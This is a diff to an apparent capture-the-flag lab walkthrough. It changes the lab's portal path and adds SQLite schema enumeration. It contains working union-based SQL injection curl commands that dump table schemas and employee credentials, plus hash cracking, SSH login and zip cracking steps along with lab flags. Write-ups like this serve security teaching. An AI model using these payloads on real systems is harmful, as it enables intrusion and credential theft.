@@ -66,30 +66,24 @@ gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/big.txt -x php
 
 Expected output:
 ```
-/sales                (Status: 301)
-/sales/index.php      (Status: 200)
+/search               (Status: 301)
+/search/index.php     (Status: 200)
 ```
 
-Visit `http://<TARGET>/sales/index.php` — an internal employee lookup portal.
+Visit `http://<TARGET>/search` — an internal employee lookup portal.
 
-View the page source (`Ctrl+U` or `curl -s http://<TARGET>/sales/index.php | head`):
-
-```html
-<!-- SMC{P4TH_FINDER} -->
-```
-
-**Flag 1: `SMC{P4TH_FINDER}`** ✓
+**Flag 1: `SMC{P4TH_FINDER}`** is displayed on the page. ✓
 
 ---
 
 ### Step 3 — Exploitation: Union-Based SQL Injection
 
-The portal has an `id` parameter: `/sales/index.php?id=1`
+The portal has an `id` parameter: `/search/index.php?id=1`
 
 **Probe the query:** try breaking it first:
 
 ```
-/sales/index.php?id=1'
+/search/index.php?id=1'
 ```
 
 If output disappears or you see an error, the parameter is injectable.
@@ -97,15 +91,41 @@ If output disappears or you see an error, the parameter is injectable.
 **Determine column count:** the original query returns 2 columns (name, department):
 
 ```bash
-curl "http://<TARGET>/sales/index.php?id=0 UNION SELECT 1,2--"
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT 1,2--"
 ```
 
 Returns: `1 | 2` — confirms 2-column output.
 
-**Extract credentials:**
+**Enumerate databases/schemas:**
+
+> This lab uses SQLite. SQLite has no `information_schema` — use `sqlite_master` instead.
 
 ```bash
-curl "http://<TARGET>/sales/index.php?id=0 UNION SELECT username,password FROM employees--"
+# List all tables
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
+```
+
+Returns something like:
+```
+employees | CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
+```
+
+**Enumerate columns** (already revealed by the `sql` field above, but explicitly):
+
+```bash
+# Read schema of a specific table
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT sql,1 FROM sqlite_master WHERE type='table' AND name='employees'--"
+```
+
+Returns:
+```
+CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
+```
+
+Now you know the column names. **Extract credentials:**
+
+```bash
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT username,password FROM employees--"
 ```
 
 Returns:
@@ -114,11 +134,6 @@ john | 0571749e2ac330a7455809c6b0e7af90
 ```
 
 You now have a username (`john`) and an MD5 password hash.
-
-> **Tip:** You can also enumerate table names via SQLite's `sqlite_master`:
-> ```
-> ?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
-> ```
 
 ---
 
@@ -225,8 +240,9 @@ cat /root/.flag.txt
 | Step | Command | Result |
 |------|---------|--------|
 | Port scan | `nmap -sV <TARGET>` | SSH + HTTP discovered |
-| Dir enum | `gobuster dir ... -x php` | `/sales/index.php` found |
-| SQLi | `?id=0 UNION SELECT username,password FROM employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
+| Dir enum | `gobuster dir ... -x php` | `/search` found |
+| SQLi enum | `?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--` | tables + columns revealed |
+| SQLi dump | `?id=0 UNION SELECT username,password FROM employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
 | Hash crack | `hashcat -m 0 hash.txt rockyou.txt` | `sunshine` |
 | SSH | `ssh john@<TARGET>` | Flag 2 + secret.zip |
 | Zip crack | `zip2john` + `john` | `master123`, Flag 3, root creds |
